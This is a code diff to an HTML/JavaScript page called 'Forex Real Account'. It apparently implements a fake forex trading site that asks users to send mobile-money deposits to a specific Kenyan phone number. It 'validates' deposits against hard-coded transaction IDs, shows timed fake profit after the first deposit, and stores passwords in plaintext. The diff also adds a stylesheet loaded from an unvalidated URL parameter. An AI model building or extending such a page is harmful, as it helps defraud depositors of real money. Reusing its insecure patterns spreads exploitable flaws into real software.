@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Forex Real Account</title>
     <link rel="stylesheet" href="style.css">
+    <link id="themeStylesheet" rel="stylesheet" href="">
 </head>
 <body>
     <div class="container">
@@ -15,7 +16,7 @@
             <section id="signup">
                 <h2>Sign Up</h2>
                 <form id="signupForm">
-                    <input type="text" id="signupPhoneNumber" placeholder="Phone Number" required>
+                    <input type="tel" id="signupPhoneNumber" placeholder="Phone Number" pattern="[0-9]{10}" required>
                     <input type="password" id="signupPassword" placeholder="Password" required>
                     <button type="submit">Sign Up</button>
                 </form>
@@ -23,7 +24,7 @@
             <section id="login">
                 <h2>Log In</h2>
                 <form id="loginForm">
-                    <input type="text" id="loginPhoneNumber" placeholder="Phone Number" required>
+                    <input type="tel" id="loginPhoneNumber" placeholder="Phone Number" pattern="[0-9]{10}" required>
                     <input type="password" id="loginPassword" placeholder="Password" required>
                     <button type="submit">Log In</button>
                 </form>
@@ -70,10 +71,10 @@
             </section>
             <section id="deposit">
                 <h2>Deposit</h2>
-                <p>Deposit to Number: <strong>12345</strong></p>
+                <p>Deposit to Number: <strong>0703606219</strong></p>
                 <form id="depositForm">
                     <input type="number" id="depositAmount" placeholder="Amount to Deposit (min 500 KSH)" required>
-                    <input type="text" id="phoneNumber" placeholder="Phone Number 12345" required>
+                    <input type="text" id="transactionId" placeholder="Transaction ID (e.g., SCL0456TLJ)" required>
                     <button type="submit">Deposit</button>
                 </form>
             </section>
@@ -127,17 +128,33 @@
         let accounts = [];
         let deposits = [];
         let withdrawals = [];
+        let validTransactions = [
+            { id: 'SCL0456TLJ', amount: 1000 },
+            { id: 'ABC1234XYZ', amount: 2000 }
+        ];
+
+        function isValidPhoneNumber(phoneNumber) {
+            const safaricomPattern = /^07[0-9]{8}$/;
+            const airtelPattern = /^01[0-9]{8}$/;
+            return safaricomPattern.test(phoneNumber) || airtelPattern.test(phoneNumber);
+        }
 
         document.getElementById('signupForm').addEventListener('submit', function(event) {
             event.preventDefault();
-            registeredPhoneNumber = document.getElementById('signupPhoneNumber').value;
-            registeredPassword = document.getElementById('signupPassword').value;
-            accounts.push({ phoneNumber: registeredPhoneNumber, password: registeredPassword, balance: 0 });
-            updateAdminDashboard();
-            alert('Sign Up successful!');
-            document.getElementById('authSection').style.display = 'none';
-            document.getElementById('mainSection').style.display = 'block';
-            document.getElementById('forexGraph').style.display = 'block';
+            const phoneNumber = document.getElementById('signupPhoneNumber').value;
+            const password = document.getElementById('signupPassword').value;
+            if (isValidPhoneNumber(phoneNumber)) {
+                registeredPhoneNumber = phoneNumber;
+                registeredPassword = password;
+                accounts.push({ phoneNumber: registeredPhoneNumber, password: registeredPassword, balance: 0 });
+                updateAdminDashboard();
+                alert('Sign Up successful!');
+                document.getElementById('authSection').style.display = 'none';
+                document.getElementById('mainSection').style.display = 'block';
+                document.getElementById('forexGraph').style.display = 'block';
+            } else {
+                alert('Invalid phone number! Please enter a registered Safaricom or Airtel Money number.');
+            }
         });
 
         document.getElementById('loginForm').addEventListener('submit', function(event) {
@@ -175,15 +192,16 @@
         document.getElementById('depositForm').addEventListener('submit', function(event) {
             event.preventDefault();
             const amount = parseFloat(document.getElementById('depositAmount').value);
-            const phoneNumber = document.getElementById('phoneNumber').value;
-            if (amount >= 500) {
+            const transactionId = document.getElementById('transactionId').value;
+            const transaction = validTransactions.find(t => t.id === transactionId && t.amount === amount);
+            if (transaction) {
                 balance += amount;
-                deposits.push({ phoneNumber, amount });
+                deposits.push({ transactionId, amount });
                 updateAdminDashboard();
                 document.getElementById('balance').textContent = balance;
                 // Simulate deposit process
                 setTimeout(() => {
-                    alert(`Deposit of ${amount} KSH successful to phone number ${phoneNumber}!`);
+                    alert(`Deposit of ${amount} KSH successful with transaction ID ${transactionId}!`);
                     if (firstDeposit) {
                         firstDeposit = false;
                         let profitInterval = setInterval(() => {
@@ -206,7 +224,7 @@
                     }
                 }, 2000); // Simulate delay for deposit process
             } else {
-                alert('Minimum deposit amount is 500 KSH.');
+                alert('Invalid transaction ID or amount!');
             }
         });
 
@@ -344,7 +362,7 @@
 
             deposits.forEach(deposit => {
                 const li = document.createElement('li');
-                li.textContent = `Phone: ${deposit.phoneNumber}, Amount: ${deposit.amount} KSH`;
+                li.textContent = `Transaction ID: ${deposit.transactionId}, Amount: ${deposit.amount} KSH`;
                 depositsList.appendChild(li);
             });
 
@@ -396,6 +414,13 @@
         }
 
         setInterval(updateLiveDemoChart, 1000); // Update every 1 second
+
+        // Apply theme based on the generated link
+        const urlParams = new URLSearchParams(window.location.search);
+        const theme = urlParams.get('theme');
+        if (theme) {
+            document.getElementById('themeStylesheet').href = `${theme}.css`;
+        }
     </script>
 </body>
 </html>
